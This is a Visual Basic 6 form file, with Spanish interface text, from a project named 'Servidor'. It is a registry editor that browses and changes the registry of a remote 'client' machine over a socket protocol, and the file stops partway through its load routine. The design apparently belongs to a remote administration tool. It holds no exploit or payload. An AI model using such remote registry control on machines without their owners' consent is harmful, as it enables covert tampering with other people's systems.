VERSION 5.00
Begin VB.Form FrmRegistry 
   Caption         =   "Editor del registro"
   ClientHeight    =   7890
   ClientLeft      =   60
   ClientTop       =   540
   ClientWidth     =   8910
   Icon            =   "FrmRegistry.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   7890
   ScaleWidth      =   8910
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox PicSpliterHorizontal 
      BorderStyle     =   0  'None
      Height          =   60
      Left            =   0
      MousePointer    =   7  'Size N S
      ScaleHeight     =   60
      ScaleWidth      =   14730
      TabIndex        =   11
      Top             =   5040
      Visible         =   0   'False
      Width           =   14730
   End
   Begin VB.PictureBox PicSearch 
      BorderStyle     =   0  'None
      Height          =   2370
      Left            =   120
      ScaleHeight     =   2370
      ScaleWidth      =   11730
      TabIndex        =   4
      Top             =   5280
      Visible         =   0   'False
      Width           =   11730
      Begin VB.CheckBox Check3 
         Caption         =   "&Datos"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   1200
         Value           =   1  'Checked
         Width           =   855
      End
      Begin VB.CheckBox Check2 
         Caption         =   "&Valores"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   840
         Value           =   1  'Checked
         Width           =   855
      End
      Begin VB.CheckBox Check1 
         Caption         =   "&Claves"
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   480
         Value           =   1  'Checked
         Width           =   855
      End
      Begin VB.CommandButton BtnSearch 
         Caption         =   "Buscar"
         Height          =   375
         Left            =   2760
         TabIndex        =   7
         Top             =   960
         Width           =   1095
      End
      Begin VB.TextBox TxtSearch 
         Height          =   300
         Left            =   1080
         TabIndex        =   6
         Top             =   480
         Width           =   2775
      End
      Begin Servidor.ucListView ucLvSearch 
         Height          =   1695
         Left            =   4080
         TabIndex        =   5
         Top             =   240
         Width           =   9975
         _ExtentX        =   17595
         _ExtentY        =   2990
      End
      Begin VB.Image Image1 
         Height          =   240
         Left            =   60
         Picture         =   "FrmRegistry.frx":014A
         Top             =   30
         Width           =   240
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Buscar"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000009&
         Height          =   255
         Left            =   360
         TabIndex        =   12
         Top             =   50
         Width           =   2415
      End
   End
   Begin VB.PictureBox PicSpliter 
      BorderStyle     =   0  'None
      Height          =   8415
      Left            =   4080
      MousePointer    =   9  'Size W E
      ScaleHeight     =   8415
      ScaleWidth      =   60
      TabIndex        =   3
      Top             =   120
      Width           =   60
   End
   Begin Servidor.ucProgressBar ucProgressBar1 
      Height          =   375
      Left            =   9120
      TabIndex        =   2
      Top             =   8640
      Visible         =   0   'False
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
   End
   Begin Servidor.ucStatusbar ucStatusbar1 
      Align           =   2  'Align Bottom
      Height          =   375
      Left            =   0
      Top             =   7515
      Width           =   8910
      _ExtentX        =   15716
      _ExtentY        =   661
   End
   Begin Servidor.ucListView ucListView1 
      Height          =   4575
      Left            =   4440
      TabIndex        =   1
      Top             =   0
      Width           =   6735
      _ExtentX        =   11880
      _ExtentY        =   8070
   End
   Begin Servidor.ucTreeView ucTreeView1 
      Height          =   4695
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   8281
   End
End
Attribute VB_Name = "FrmRegistry"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function GetFocus Lib "user32.dll" () As Long
Private Declare Function PutFocus Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Private Declare Sub Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long)
Private Declare Function GetTickCount Lib "kernel32.dll" () As Long
Private Declare Function DrawCaption Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long, pcRect As RECT, ByVal un As Long) As Long
Private Declare Function DrawThemeBackGround Lib "uxtheme.dll" Alias "DrawThemeBackground" (ByVal hTheme As Long, ByVal lhdc As Long, ByVal iPartId As Long, ByVal iStateId As Long, pRect As RECT, pClipRect As Any) As Long
Private Declare Function OpenThemeData Lib "uxtheme.dll" (ByVal hwnd As Long, ByVal pszClassList As Long) As Long
Private Declare Function CloseThemeData Lib "uxtheme.dll" (ByVal hTheme As Long) As Long

Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Private Const WM_SETICON As Long = &H80
Private Const WM_SETTEXT As Long = &HC


Const DC_ACTIVE = &H1
Const DC_NOTACTIVE = &H2
Const DC_ICON = &H4
Const DC_TEXT = &H8
Const BDR_SUNKENOUTER = &H2
Const BDR_RAISEDINNER = &H4
Const EDGE_ETCHED = (BDR_SUNKENOUTER Or BDR_RAISEDINNER)
Const BF_BOTTOM = &H8
Const BF_LEFT = &H1
Const BF_RIGHT = &H4
Const BF_TOP = &H2
Const BF_RECT = (BF_LEFT Or BF_TOP Or BF_RIGHT Or BF_BOTTOM)
Const DFC_BUTTON = 4
Const DFC_POPUPMENU = 5            'Only Win98/2000 !!
Const DFCS_BUTTON3STATE = &H10
Const DT_CENTER = &H1
Const DC_GRADIENT = &H20          'Only Win98/2000 !!

Private Const sDefaultName = "(Predeterminado)"
Private Const sDefaultValue = "(valor no establecido)"
Private Const sDefaultZERO = "(valor binario de longitud cero)"
Private Const sDefaultWORD = "0x00000000 (0)"


Private Const Delimiter As String = "|"
Private Const Delim2 As String = "#%."
Private Const Delim3 As String = "@&|?"
Private Const END_DATA As String = "¡@#@!"

Public ParentID As Long
Public SocketID As Long

Private m_Data As String
Private RemoteIP As String
Private WithEvents FrmEdit As FrmEditValue
Attribute FrmEdit.VB_VarHelpID = -1
Private cMenuImage         As clsMenuImage

Private sNames() As String
Private arrTypes() As Long
Private vData() As Variant

Private LastNode As Long
Private m_hNode As Long
Private m_CurrentPath As String
Private HasDefault As Boolean
Private ClientRetCommand As Long
Private ClientRetMsg As String
Private hFocus As Long
Private cImgList As clsImgList

Private Sub BtnSearch_Click()
    Dim sPath As String
    
    If BtnSearch.Tag = "1" Then
        WinSock32.SendData SocketID, 10 & Delimiter & END_DATA
    Else
        sPath = ExplainPath(ucTreeView1.NodeFullPath(ucTreeView1.SelectedNode))
        If sPath = RemoteIP Then sPath = vbNullString
        
        ucLvSearch.Clear
        WinSock32.SendData SocketID, 9 & Delimiter & TxtSearch & Delimiter & Check1 & Delimiter & Check2 & Delimiter & Check3 & Delimiter & sPath & END_DATA
        BtnSearch.Caption = "Canelar"
        BtnSearch.Tag = 1
        StateWait True
    End If
    
End Sub

Private Sub FrmEdit_UserOK(Key As String, Name As String, RegType As rcRegType, Value As Variant)
   
    If ExecuteQuery("2" & Delimiter & Key & Delim2 & Name & Delim2 & RegType & Delim2 & Value & END_DATA) Then
        Call ActualizeList
    Else
        MsgBox "Error, no se pudo cambiar el valor", vbCritical
    End If
End Sub

Private Function ShowPopUpMenu(ByVal MenuType As Long) As Long
    Dim hMenu As Long
    Dim hSubMenu1 As Long
    Dim hSubMenu2 As Long
    Dim PT As POINTAPI
    Dim IsValidKey As Boolean
    Dim MnuState As Long
    
    hMenu = CreatePopupMenu()

    Select Case MenuType
    
        Case 1, 2
 
            If (ucTreeView1.GetNodeKey(ucTreeView1.SelectedNode) = "\") Or _
                         (ucTreeView1.GetNodeKey(ucTreeView1.NodeParent(ucTreeView1.SelectedNode)) = "\") Then
                MnuState = MF_GRAYED
            End If
                         
            hSubMenu1 = CreatePopupMenu()
            
            AppendMenu hSubMenu1, MF_STRING, 1, "Clave"
            AppendMenu hSubMenu1, MF_SEPARATOR, 100, ByVal 0&
            AppendMenu hSubMenu1, MF_STRING, 2, "Valor alfanumérico"
            AppendMenu hSubMenu1, MF_STRING, 3, "Valor binario"
            AppendMenu hSubMenu1, MF_STRING, 4, "Valor DWORD"
            AppendMenu hSubMenu1, MF_STRING, 5, "Valor de cadena múltiple"
            AppendMenu hSubMenu1, MF_STRING, 6, "Valor de cadena expandible"
            
            AppendMenu hMenu, MF_POPUP, hSubMenu1, "Nuevo"
            
            If MenuType = 1 Then  'TreeView (Key Reg)
                AppendMenu hMenu, MF_STRING, 7, "Buscar"
                AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
                AppendMenu hMenu, MF_STRING Or MnuState, 8, "Eliminar"
                AppendMenu hMenu, MF_STRING Or MnuState, 9, "Cambiar nombre"
                AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
                AppendMenu hMenu, MF_STRING, 10, "Copiar nombre de la clave"
            Else
                AppendMenu hMenu, MF_STRING, 7, "Actualizar"
            End If
            

            With cMenuImage

                If Not .IsWindowVistaOrLater Then
                    .RemoveMenuCheckApi hMenu
                    .RemoveMenuCheckApi hSubMenu1
                End If
                
                .PutImageToApiMenu 0, hMenu, 0
                .PutImageToApiMenu 1, hSubMenu1, 0
                .PutImageToApiMenu 2, hSubMenu1, 2
                .PutImageToApiMenu 3, hSubMenu1, 3
                .PutImageToApiMenu 3, hSubMenu1, 4
                .PutImageToApiMenu 2, hSubMenu1, 5
                .PutImageToApiMenu 2, hSubMenu1, 6
                
                If MenuType = 1 Then 'TreeView (Key Reg)
                    .PutImageToApiMenu 4, hMenu, 1
                    .PutImageToApiMenu 5, hMenu, 3
                    .PutImageToApiMenu 6, hMenu, 4
                    .PutImageToApiMenu 7, hMenu, 6
                Else
                    .PutImageToApiMenu 9, hMenu, 1
                End If
                
            End With
            
        Case 3
            AppendMenu hMenu, MF_POPUP, 1, "Modificar"
            AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
            AppendMenu hMenu, MF_STRING, 2, "Eliminar"
            AppendMenu hMenu, MF_STRING, 3, "Cambiar nombre"
            
            With cMenuImage

                If Not .IsWindowVistaOrLater Then .RemoveMenuCheckApi hMenu

                .PutImageToApiMenu 8, hMenu, 0
                .PutImageToApiMenu 5, hMenu, 2
                .PutImageToApiMenu 6, hMenu, 3
                
            End With
        Case 4
            AppendMenu hMenu, MF_POPUP, 1, "Buscar"
            cMenuImage.PutImageToApiMenu 4, hMenu, 0

    End Select

    GetCursorPos PT
    ShowPopUpMenu = TrackPopupMenuEx(hMenu, TPM_RETURNCMD, PT.X, PT.Y, Me.hwnd, ByVal 0&)
    
    DestroyMenu hMenu
    

End Function




Private Sub ListRegValues(ByVal sData As String)

    Dim i As Long
    Dim iIcon As Long
    Dim lCount As Long
    Dim HexValue As String
    
    Dim SplitData() As String
    Dim SubSplit() As String
    Dim Index As Long
    

    With ucListView1
        
        SplitData = Split(sData, Delim3)
        lCount = UBound(SplitData)

        If lCount > 0 Then
        
            ReDim Preserve sNames(UBound(sNames) + lCount)
            ReDim Preserve arrTypes(UBound(arrTypes) + lCount)
            ReDim Preserve vData(UBound(vData) + lCount)

            
            For i = 0 To lCount - 1
                Index = .Count
                SubSplit = Split(SplitData(i), Delim2)
                
                sNames(Index) = SubSplit(0)
                arrTypes(Index) = SubSplit(1)
                vData(Index) = SubSplit(2)
                
                If arrTypes(Index) = REG_BINARY Or arrTypes(Index) = REG_DWORD Then
                    iIcon = 1
                Else
                    iIcon = 0
                End If

                If Len(sNames(Index)) Then
                    .ItemAdd Index, sNames(Index), 0, iIcon, Index
                Else
                    HasDefault = True
                    .ItemAdd Index, sDefaultName, 0, iIcon, Index
                End If
        
                .SubItemText(Index, 1) = RegTypeToStr(arrTypes(Index))
                .SubItemText(Index, 2) = GetDataFormat(arrTypes(Index), vData(Index))



            Next

        End If

    End With
End Sub

Private Sub CompleteSearch(ByVal sData As String)
    Dim vData() As String
    Dim lCount As Long
    
    vData = Split(sData, Delim2)
        
    With ucLvSearch
        lCount = .Count
            .ItemAdd lCount, vData(0), 0, 0, 0
        Select Case vData(2)
            Case REG_NONE
                
            Case REG_BINARY, REG_DWORD
                .SubItemSet lCount, 1, vData(1), 2
                .SubItemText(lCount, 2) = RegTypeToStr(vData(2))
                .SubItemText(lCount, 3) = GetDataFormat(vData(2), vData(3))
            Case Else
                .SubItemSet lCount, 1, vData(1), 1
                .SubItemText(lCount, 2) = RegTypeToStr(vData(2))
                .SubItemText(lCount, 3) = GetDataFormat(vData(2), vData(3))
        End Select


    End With
End Sub

Private Function RegTypeToStr(ByVal RegType As rcRegType) As String
    Select Case RegType
        Case REG_BINARY: RegTypeToStr = "REG_BINARY"
        Case REG_DWORD: RegTypeToStr = "REG_DWORD"
        Case REG_SZ: RegTypeToStr = "REG_SZ"
        Case REG_MULTI_SZ: RegTypeToStr = "REG_MULTI_SZ"
        Case REG_EXPAND_SZ: RegTypeToStr = "REG_EXPAND_SZ"
    End Select
End Function


Private Function GetDataFormat(ByVal RegType As rcRegType, ByVal vData As Variant) As String
    On Local Error Resume Next
    Dim HexValue As String
    Select Case RegType
    
        Case REG_SZ

            If Len(vData) Then
                GetDataFormat = vData
            Else
                GetDataFormat = sDefaultValue
            End If

        Case REG_BINARY

            If Len(vData) Then
                GetDataFormat = BinaryToHex(vData, 30)
            Else
                GetDataFormat = sDefaultZERO
            End If
            
        Case REG_DWORD

            If CLng(vData) Then
                HexValue = BigHex(vData)
                GetDataFormat = "0x" & String(8 - Len(HexValue), "0") & HexValue & " (" & LongToCurrency(vData) & ")"
            Else
                GetDataFormat = sDefaultWORD
            End If
        
        Case REG_MULTI_SZ

            GetDataFormat = Replace(Replace(CStr(vData), vbCrLf, " "), vbNullChar, " ")
            
        Case REG_EXPAND_SZ

             GetDataFormat = vData

    End Select
End Function


Private Sub ListRegKeys(ByVal sData As String)
    Dim sKeys() As String, nKeys As Long
    Dim sPath As String
    Dim i As Long
    Dim lCount As Long
    Dim sDataKey() As String

    sKeys() = Split(sData, Delimiter)
    
    nKeys = UBound(sKeys)
    
    
    If nKeys > 0 Then
        'Call ucTreeView1.SetRedrawMode(Enable:=False)
        lCount = ucTreeView1.NodeCount
        
        
        For i = 0 To nKeys - 1
            sDataKey = Split(sKeys(i), vbCrLf)
            Call ucTreeView1.AddNode(m_hNode, , CStr(lCount + i), sDataKey(0), 1, 2, sDataKey(1))
        Next
        
        'Call ucTreeView1.SetRedrawMode(Enable:=True)

    End If

End Sub






Private Sub PicSearch_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Static InButton As Boolean
    If X > Me.ScaleWidth - 240 And Y > 20 And Y < 230 Then
        DrawTheme PicSearch.hdc, "window", 19, 2, (PicSearch.ScaleWidth / Screen.TwipsPerPixelX) - 18, 4, 13, 13
        InButton = True
        PicSearch.Refresh
    Else
        If InButton Then
            DrawTheme PicSearch.hdc, "window", 19, 1, (PicSearch.ScaleWidth / Screen.TwipsPerPixelX) - 18, 4, 13, 13
            InButton = False
            PicSearch.Refresh
        End If
    End If
    
End Sub

Private Sub PicSearch_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If X > Me.ScaleWidth - 240 And Y > 20 And Y < 230 Then
        If BtnSearch.Tag = "1" Then
            WinSock32.SendData SocketID, 10 & Delimiter & END_DATA
        End If
        PicSearch.Visible = False
        PicSpliterHorizontal.Visible = False
        ucLvSearch.Clear
        Form_Resize
        WinSock32.SendData SocketID, "10" & Delimiter & END_DATA
    End If
End Sub

Private Sub PicSearch_Resize()

    'PicSearch.Refresh
End Sub

Private Sub ucListView1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim Item As Long
    Dim lRet As Long
    Dim ItemData As Long
    Dim ValueText As String
    If Button = vbRightButton Then
        Item = ucListView1.ItemHitTest(X, Y)
        If Item <> -1 Then
            ItemData = ucListView1.ItemData(Item)
            If ItemData <> -1 Then
                ValueText = sNames(ItemData)
            End If
            ucListView1.ItemSelected(Item) = True
            lRet = ShowPopUpMenu(3)
            Select Case lRet
                Case 1 'Edit Value
                    Call ucListView1_ItemDblClick(Item)
                Case 2 'Delete value
                    If MsgBox("¿Confirma que desea eliminar este valor?", vbYesNo, "Confirmar eliminación del valor") = vbYes Then
                        If ExecuteQuery("3" & Delimiter & m_CurrentPath & Delim2 & ValueText & END_DATA) Then
                            Call ActualizeList
                        Else
                            MsgBox "No se pudo eliminar el valor especificado", vbCritical, "Error al eliminar valor"
                        End If
                    End If
                Case 3 'Edit Name
                    ucListView1.StartLabelEdit Item
            End Select
        Else
            If ucTreeView1.GetNodeKey(ucTreeView1.SelectedNode) <> "\" Then
                lRet = ShowPopUpMenu(2)
                Select Case lRet
                    Case 1 To 6
                        ExecuteCommandNew lRet
                    Case 7
                        Call ActualizeList
                End Select
            End If
        End If
        
    End If
End Sub

Private Sub ucListView1_AfterLabelEdit(Cancel As Long, NewString As String)

    Dim sOldName As String
    Dim sPath As String
    Dim hNode As Long
    Dim ItemData As Long
    Dim sRet As String
 
    If Not NameExist(NewString, False) Then
        
        sOldName = ucListView1.ItemText(ucListView1.GetSelectedItem)
        If ExecuteQuery("4" & Delimiter & m_CurrentPath & Delim2 & sOldName & Delim2 & NewString & END_DATA, sRet) Then
            ItemData = ucListView1.ItemData(ucListView1.GetSelectedItem)
            sNames(ItemData) = NewString
        Else
            Cancel = 1
            MsgBox "No se pudo cambiar el nombre del valor.", vbCritical, "Error al cambiar el nombre de un valor"
        End If
    Else
        Cancel = 1
        MsgBox "No se puede cambiar el nombre porque este ya existe. Escriba otro nombre y vuelva a intentarlo.", vbCritical, "Error al cambiar el nombre de un valor"
    End If
    
End Sub

Private Sub ucListView1_BeforeLabelEdit(Cancel As Long)
    If ucListView1.ItemText(ucListView1.GetSelectedItem) = sDefaultName Then Cancel = 1
End Sub


Private Sub ucTreeView1_AfterLabelEdit(ByVal hNode As Long, Cancel As Integer, NewString As String)
    Dim sPath As String

    If Not NameExist(NewString, True) Then
        m_CurrentPath = ExplainPath(ucTreeView1.NodeFullPath(hNode))
        If ExecuteQuery("5" & Delimiter & m_CurrentPath & Delim2 & NewString & END_DATA) Then
           m_CurrentPath = ExplainPath(ucTreeView1.NodeFullPath(ucTreeView1.NodeParent(hNode))) & "\" & NewString
           ucStatusbar1.PanelText(1) = RemoteIP & "\" & m_CurrentPath
        Else
            Cancel = 1
            MsgBox "No se pudo cambiar el nombre de la clave.", vbCritical, "Error al cambiar el nombre de una clave."
        End If
    Else
        Cancel = 1
        MsgBox "No se puede cambiar el nombre porque este ya existe. Escriba otro nombre y vuelva a intentarlo.", vbCritical, "Error al cambiar el nombre de una clave"
    End If
End Sub

Private Sub ucTreeView1_BeforeLabelEdit(ByVal hNode As Long, Cancel As Integer)
    If ucTreeView1.GetNodeKey(ucTreeView1.NodeParent(hNode)) = "\" Or ucTreeView1.GetNodeKey(hNode) = "\" Then
        Cancel = 1
    End If
End Sub

Private Function ExecuteQuery(ByVal sData As String, Optional ByRef sReturn As String) As Boolean
    Dim lTimeOut As Long

    If WinSock32.SendData(SocketID, sData) Then
        ClientRetCommand = -1
        lTimeOut = GetTickCount + 5000

        Do While ClientRetCommand = -1
            DoEvents
            Sleep 10
            If lTimeOut < GetTickCount Then
                MsgBox "El cliente no respondió a la petición.", vbCritical, "Error"
                Exit Function
            End If
        Loop
        sReturn = ClientRetMsg
        ExecuteQuery = ClientRetCommand
    Else
        MsgBox "No se pudo enviar la petición.", vbCritical, "Error"
    End If
End Function



Private Sub ucTreeView1_MouseUp(Button As Integer, Shift As Integer, X As Long, Y As Long)
    Dim lRet As Long
    
    If Button = vbRightButton Then
    
        If ucTreeView1.GetNodeKey(ucTreeView1.SelectedNode) = "\" Then
            If ShowPopUpMenu(4) Then
                PicSearch.Visible = True
                PicSpliterHorizontal.Visible = True
                Form_Resize
            End If
            Exit Sub
        End If
        
        lRet = ShowPopUpMenu(1)
        Select Case lRet
            Case 1 To 6
                ExecuteCommandNew lRet
            Case 7
                PicSearch.Visible = True
                PicSpliterHorizontal.Visible = True
                Form_Resize

            Case 8
                If ExecuteQuery("8" & Delimiter & m_CurrentPath & END_DATA) Then
                    ucTreeView1.DeleteNode ucTreeView1.SelectedNode
                    m_hNode = ucTreeView1.SelectedNode
                    m_CurrentPath = ExplainPath(ucTreeView1.NodeFullPath(m_hNode))
                    ucStatusbar1.PanelText(1) = ucTreeView1.NodeFullPath(m_hNode)
                    
                Else
                    MsgBox "No se pudo eliminar la clave", vbCritical, "Error eliminar una clave"
                End If
            Case 9
                ucTreeView1.StartLabelEdit m_hNode
            Case 10
                Clipboard.Clear
                Clipboard.SetText m_CurrentPath
                
        End Select
        

    End If
End Sub


Private Sub ExecuteCommandNew(ByVal lRet As Long)

    Dim sNewName As String
    Dim RegType As rcRegType
    Dim lCount As Long
    
        Select Case lRet
            Case 1
                sNewName = GetNewName(True)
                If ExecuteQuery("6" & Delimiter & m_CurrentPath & "\" & sNewName & END_DATA) Then
                    m_CurrentPath = m_CurrentPath & "\" & sNewName
                    With ucTreeView1
                        m_hNode = .AddNode(.SelectedNode, rLast, CStr(.NodeCount), sNewName, 1, 2)
                        .Expand .SelectedNode
                        .SelectedNode = m_hNode
                        .StartLabelEdit m_hNode
                    End With
                    
                Else
                    MsgBox "No se pudo crear la clave", vbCritical, "Error al crear una clave"
                End If
            Case 2 To 6
                sNewName = GetNewName(False)
                
                RegType = Array(REG_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_EXPAND_SZ)(lRet - 2)
                
                If ExecuteQuery("7" & Delimiter & m_CurrentPath & Delim2 & sNewName & Delim2 & RegType & END_DATA) Then
                
                    With ucListView1
                        lCount = .Count
                        .ItemAdd lCount, sNewName, 0, IIf(lRet = 3 Or lRet = 4, 1, 0), lCount - 1
                        
                        ReDim Preserve sNames(lCount - 1)
                        ReDim Preserve arrTypes(lCount - 1)
                        ReDim Preserve vData(lCount - 1)
                        
                        sNames(lCount - 1) = sNewName
                        arrTypes(lCount - 1) = RegType
                        .SubItemText(lCount, 1) = Array("REG_SZ", "REG_BINARY", "REG_DWORD", "REG_MULTI_SZ", "REG_EXPAND_SZ")(lRet - 2)
                        .StartLabelEdit lCount
                    End With
                    
                Else
                    MsgBox "No se pudo crear el valor", vbCritical, "Error al crear un valor"
                End If
            End Select

End Sub

Private Sub ucTreeView1_NodeClick(ByVal hNode As Long)
    Dim sPath As String
    If LastNode <> hNode Then
        
        LastNode = hNode
        ucStatusbar1.PanelText(1) = ucTreeView1.NodeFullPath(hNode)
        sPath = ExplainPath(ucTreeView1.NodeFullPath(hNode))
        
        If sPath <> RemoteIP Then
            m_hNode = hNode
            m_CurrentPath = sPath
            Call ActualizeList
        Else
            ucListView1.Clear
        End If
    End If
End Sub

Private Sub ActualizeList()
    ucListView1.Clear
    
    ReDim sNames(0)
    ReDim arrTypes(0)
    ReDim vData(0)
    HasDefault = False
    If WinSock32.SendData(SocketID, "1" & Delimiter & m_CurrentPath & END_DATA) Then
         StateWait True
    End If
End Sub

Private Sub ucTreeView1_MouseDown(Button As Integer, Shift As Integer, X As Long, Y As Long)
    Dim hNode As Long
    
    If Button = vbRightButton Then
        hNode = ucTreeView1.HitTest(X, Y)
        If hNode <> 0 Then
            ucTreeView1.SelectedNode = hNode
            ucTreeView1.Expand hNode
            m_hNode = hNode

        End If
    End If
End Sub

Private Sub ucTreeView1_Collapse(ByVal hNode As Long)
    If ucTreeView1.GetNodeKey(hNode) <> "\" Then
        ucTreeView1.NodeImage(hNode) = 1
        ucTreeView1.NodeSelectedImage(hNode) = 1
    End If
End Sub

Private Sub ucTreeView1_ExpandAfter(ByVal hNode As Long, ByVal ExpandedOnce As Boolean)
    If ucTreeView1.GetNodeKey(hNode) <> "\" Then
        ucTreeView1.NodeImage(hNode) = 2
        ucTreeView1.NodeSelectedImage(hNode) = 2
    End If
End Sub

Private Sub ucTreeView1_ExpandBefore(ByVal hNode As Long, ByVal ExpandedOnce As Boolean)
    Dim sPath As String
    If ucTreeView1.GetNodeKey(hNode) <> "\" Then
        'AddNewSubKeys hNode
        If ucTreeView1.NodeChildren(hNode) = 0 Then
            m_hNode = hNode
            sPath = ExplainPath(ucTreeView1.NodeFullPath(hNode))
            If WinSock32.SendData(SocketID, "0" & Delimiter & sPath & END_DATA) Then
                StateWait True
            End If
        End If
    End If
End Sub

Private Sub StateWait(ByVal bEnabled As Boolean)
    If bEnabled Then hFocus = GetFocus
    ucTreeView1.Enabled = Not bEnabled
    ucListView1.Enabled = Not bEnabled
    ucProgressBar1.Marquee = bEnabled
    ucProgressBar1.Visible = bEnabled
    DoEvents
    If Not bEnabled Then PutFocus hFocus
End Sub


Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    'On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    Dim vData()     As String
    
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left$(sBuf, lRet2 - 1)
        sBuf = Mid$(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0
                ListRegKeys sBuf
            Case 1
                ucTreeView1.Expand m_hNode
                StateWait False
            Case 2
                ListRegValues sBuf

            Case 3

                With ucListView1
                    
                    .Sort 0, soAscending, stString
        
                    If Not HasDefault Then
                        .ItemAdd 0, sDefaultName, 0, 0, -1
                        .SubItemText(0, 1) = "REG_SZ"
                        .SubItemText(0, 2) = sDefaultValue
                    End If
                End With
                
                StateWait False

            Case 4
                vData = Split(sBuf, Delim2)
                ClientRetMsg = vData(1)
                ClientRetCommand = vData(0)
                
            Case 5 'Item Find
                CompleteSearch sBuf
                
            Case 6 'End Search
                StateWait False
                BtnSearch.Tag = 0
                BtnSearch.Caption = "Buscar"
                Beep
        End Select
        
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(id, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    Me.Caption = "Editor del registro - Sin Conexión"
    ucTreeView1.Enabled = False
    ucListView1.Enabled = False
    PicSearch.Enabled = False
    TerminateConnection SocketID
    SocketID = 0
End Sub

Private Sub ucListView1_ItemDblClick(Item As Long)
    Dim ItemData As Long
    Set FrmEdit = New FrmEditValue

    ItemData = ucListView1.ItemData(Item)

    With FrmEdit
        .Key = ExplainPath(ucTreeView1.NodeFullPath(ucTreeView1.SelectedNode))

        If ItemData = -1 Then
            .RegType = REG_SZ
            .KeyName = vbNullString
            .Value = vbNullString
        Else
            .RegType = arrTypes(ItemData)
            .KeyName = sNames(ItemData)
            .Value = vData(ItemData)

        End If
        
        .Show vbModal, Me
    End With
    
End Sub

Private Sub Form_Load()
    Dim NodRoot As Long
    Dim NodChild As Long
    Dim i As Long
    Dim hIcon As Long
    
    With ucTreeView1
        
        Call .Initialize
        Call .InitializeImageList
     
        Call .AddBitmap(LoadResPicture(11, vbResBitmap))
        
        .HasLines = True
        .HasButtons = True
        .LabelEdit = True

        Call .SetRedrawMode(Enable:=False)
        
        RemoteIP = WinSock32.IPAddresses(CStr(SocketID))
        
        NodRoot = .AddNode(, , "\", RemoteIP, 0, 0)
        
        NodChild = .AddNode(NodRoot, , "HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT", 1, 2, True)
        NodChild = .AddNode(NodRoot, , "HKEY_CURRENT_USER", "HKEY_CURRENT_USER", 1, 2, True)
        NodChild = .AddNode(NodRoot, , "HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE", 1, 2, True)
        NodChild = .AddNode(NodRoot, , "HKEY_USERS", "HKEY_USERS", 1, 2, True)
        NodChild = .AddNode(NodRoot, , "HKEY_CURRENT_CONFIG", "HKEY_CURRENT_CONFIG", 1, 2, True)
  
        Call .Expand(NodRoot)

        Call .SetRedrawMode(Enable:=True)
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
        
    End With

    With ucListView1
        .Initialize
    
        .InitializeImageListSmall
        '.ImageListSmall_AddIcon LoadResPicture(122, vbResIcon)
        '.ImageListSmall_AddIcon LoadResPicture(121, vbResIcon)
        .ImageListSmall_AddBitmap LoadResPicture(12, vbResBitmap)

        
        .ColumnAdd 0, "Nombre", 300
        .ColumnAdd 0, "Tipo", 100
        .ColumnAdd 0, "Datos", 300
        
        .ViewMode = vmDetails
        .LabelEdit = True
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    With ucStatusbar1
        Call .Initialize(SizeGrip:=True)
        Call .AddPanel(, , , [sbSpring], RemoteIP, , 0)
        Call .AddPanel(, 200, , [sbContents], "Listo")
    End With
    
    Set cMenuImage = New clsMenuImage
    Set cImgList = New clsImgList
    
    cImgList.Init 16, 16
    cImgList.AddBitmap LoadResPicture(10, vbResBitmap)
    

    
    With cMenuImage
        .Init Me.hwnd, 16, 16
  
        For i = 0 To 9
            hIcon = cImgList.GetIcon(i)
            .AddIconFromHandle hIcon, , True
            DestroyIcon hIcon
        Next
    End With
    
    With ucLvSearch
        .Initialize
    
        .InitializeImageListSmall
        .ImageListSmall_AddBitmap LoadResPicture(13, vbResBitmap)
        
        .ColumnAdd 0, "Clave", 300
        .ColumnAdd 0, "Nombre", 100
        .ColumnAdd 0, "Tipo", 100
        .ColumnAdd 0, "Datos", 300
        
        .ViewMode = vmDetails
        .SubItemImages = True
        .LabelTips = True
        .FullRowSelect = True
        .Top = 315
    End With
    
   
PicSearch.AutoRedraw = True
  
